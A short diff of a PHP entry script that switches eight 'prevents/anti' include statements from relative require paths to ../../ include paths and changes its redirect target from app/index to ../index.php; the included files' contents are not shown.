@@ -1,11 +1,11 @@
 <?php
-	require 'prevents/anti1.php';
-	require 'prevents/anti2.php';
-	require 'prevents/anti3.php';
-	require 'prevents/anti4.php';
-	require 'prevents/anti5.php';
-	require 'prevents/anti6.php';
-	require 'prevents/anti7.php';
-	require 'prevents/anti8.php';
-	exit(header("Location: app/index"));
+  	include '../../prevents/anti1.php';
+    include '../../prevents/anti2.php';
+    include '../../prevents/anti3.php';
+    include '../../prevents/anti4.php';
+    include '../../prevents/anti5.php';
+    include '../../prevents/anti6.php';
+    include '../../prevents/anti7.php';
+    include '../../prevents/anti8.php';
+	exit(header("Location: ../index.php"));
 ?>
